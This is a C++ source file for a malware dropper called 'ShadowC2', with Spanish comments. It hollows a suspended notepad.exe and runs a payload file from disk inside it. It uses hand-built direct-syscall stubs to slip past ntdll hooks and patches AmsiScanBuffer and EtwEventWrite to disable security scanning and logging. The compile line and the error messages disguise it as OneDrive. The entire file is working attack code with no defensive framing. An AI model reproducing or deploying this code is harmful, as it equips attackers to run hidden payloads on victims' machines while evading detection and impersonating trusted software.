/**
 * ShadowC2 - Process Hollowing Dropper
 * Usa stubs de syscall allocados en memoria (evade hooks de ntdll)
 * Compilar: x86_64-w64-mingw32-g++ -o OneDrive_Sync.exe hollow_dropper.cpp \
 *           -s -O2 -static -Wl,--subsystem,windows
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <vector>

// ============ SYSCALL STUB GENERATOR ============
// Crea stubs en memoria ejecutable para llamar al kernel directamente

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtResumeThread)(HANDLE, PULONG);

// Stub x64: mov r10,rcx | mov eax,NUM | syscall | ret
template<typename T>
T CreateSyscallStub(WORD syscallNum) {
    BYTE stub[] = {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, syscallNum
        0x0F, 0x05,                   // syscall
        0xC3                          // ret
    };
    *(DWORD*)(stub + 4) = (DWORD)syscallNum;
    
    PVOID mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return nullptr;
    memcpy(mem, stub, sizeof(stub));
    return (T)mem;
}

// Leer syscall number desde ntdll.dll
WORD GetSyscallNumber(LPCSTR funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    FARPROC func = GetProcAddress(hNtdll, funcName);
    if (!func) return 0;
    
    BYTE* bytes = (BYTE*)func;
    // Buscar: mov r10,rcx (4C 8B D1) seguido de mov eax,XX (B8 XX XX XX XX)
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) {
        return *(WORD*)(bytes + 4); // Syscall number (usualmente WORD)
    }
    // Fallback para otras firmas
    if (bytes[0] == 0xB8) {
        return *(WORD*)(bytes + 1);
    }
    return 0;
}

// ============ BYPASSES ============
bool bypass_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;
    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return true;
    LPVOID pAddr = (LPVOID)pAmsiScan;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

bool bypass_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    LPVOID pAddr = (LPVOID)pEtwEventWrite;
    BYTE patch[] = { 0xC3 };
    DWORD oldProtect;
    VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

// ============ LEER PAYLOAD ============
std::vector<BYTE> read_payload_file(const char* path) {
    std::vector<BYTE> data;
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return data;
    DWORD size = GetFileSize(hFile, NULL);
    data.resize(size);
    DWORD read;
    ReadFile(hFile, data.data(), size, &read, NULL);
    CloseHandle(hFile);
    return data;
}

// ============ PROCESS HOLLOWING ============
bool do_hollowing(const std::vector<BYTE>& payloadPE) {
    // Obtener syscalls
    WORD scUnmap = GetSyscallNumber("NtUnmapViewOfSection");
    WORD scAlloc = GetSyscallNumber("NtAllocateVirtualMemory");
    WORD scWrite = GetSyscallNumber("NtWriteVirtualMemory");
    WORD scProtect = GetSyscallNumber("NtProtectVirtualMemory");
    WORD scResume = GetSyscallNumber("NtResumeThread");
    
    auto NtUnmap = CreateSyscallStub<pNtUnmapViewOfSection>(scUnmap ? scUnmap : 0x2A);
    auto NtAlloc = CreateSyscallStub<pNtAllocateVirtualMemory>(scAlloc ? scAlloc : 0x18);
    auto NtWrite = CreateSyscallStub<pNtWriteVirtualMemory>(scWrite ? scWrite : 0x3A);
    auto NtProtect = CreateSyscallStub<pNtProtectVirtualMemory>(scProtect ? scProtect : 0x50);
    auto NtResume = CreateSyscallStub<pNtResumeThread>(scResume ? scResume : 0x52);
    
    if (!NtUnmap || !NtAlloc || !NtWrite || !NtProtect || !NtResume) {
        return false;
    }
    
    // 1. Crear notepad.exe suspendido
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t target[] = L"C:\\Windows\\System32\\notepad.exe";
    
    if (!CreateProcessW(nullptr, target, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        return false;
    }
    
    // 2. Obtener contexto
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // 3. Leer ImageBase del PEB
    PVOID pebImageBase = nullptr;
    #ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &pebImageBase, sizeof(PVOID), nullptr);
    #else
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x8, &pebImageBase, sizeof(PVOID), nullptr);
    #endif
    
    // 4. Unmap con SYSCALL DIRECTO
    NtUnmap(pi.hProcess, pebImageBase);
    
    // 5. Parsear payload PE
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadPE.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadPE.data() + dosHeader->e_lfanew);
    
    // 6. Allocar memoria
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    PVOID newImageBase = pebImageBase;
    
    NTSTATUS status = NtAlloc(pi.hProcess, &newImageBase, 0, &imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (status < 0) { // NT_ERROR
        newImageBase = nullptr;
        status = NtAlloc(pi.hProcess, &newImageBase, 0, &imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (status < 0) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }
    
    // 7. Escribir headers
    NtWrite(pi.hProcess, newImageBase, (PVOID)payloadPE.data(),
        ntHeaders->OptionalHeader.SizeOfHeaders, nullptr);
    
    // 8. Escribir secciones
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        NtWrite(pi.hProcess,
            (PBYTE)newImageBase + section[i].VirtualAddress,
            (PVOID)(payloadPE.data() + section[i].PointerToRawData),
            section[i].SizeOfRawData, nullptr);
    }
    
    // 9. Actualizar entry point y PEB
    #ifdef _WIN64
    ctx.Rcx = (DWORD64)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10, &newImageBase, sizeof(PVOID), nullptr);
    #else
    ctx.Eax = (DWORD)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Ebx + 0x8, &newImageBase, sizeof(PVOID), nullptr);
    #endif
    
    // 10. Proteger secciones
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID sectionAddr = (PBYTE)newImageBase + section[i].VirtualAddress;
        SIZE_T sectionSize = section[i].Misc.VirtualSize;
        ULONG oldProtect;
        ULONG newProtect = PAGE_EXECUTE_READWRITE;
        
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                newProtect = PAGE_EXECUTE_READWRITE;
            else
                newProtect = PAGE_EXECUTE_READ;
        } else if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE;
        } else {
            newProtect = PAGE_READONLY;
        }
        
        NtProtect(pi.hProcess, &sectionAddr, &sectionSize, newProtect, &oldProtect);
    }
    
    // 11. Reanudar
    NtResume(pi.hThread, nullptr);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ============ MAIN ============
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    bypass_amsi();
    bypass_etw();
    
    auto payload = read_payload_file("hollow_payload.exe");
    
    if (payload.empty()) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        char* lastSlash = strrchr(path, '\\');
        if (lastSlash) {
            strcpy(lastSlash + 1, "hollow_payload.exe");
            payload = read_payload_file(path);
        }
    }
    
    if (payload.empty()) {
        MessageBoxA(NULL, "Error al cargar componentes.", "OneDrive", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    if (do_hollowing(payload)) {
        ExitProcess(0);
    } else {
        MessageBoxA(NULL, "Error al inicializar componentes.", "OneDrive", MB_OK | MB_ICONERROR);
        return 1;
    }
}
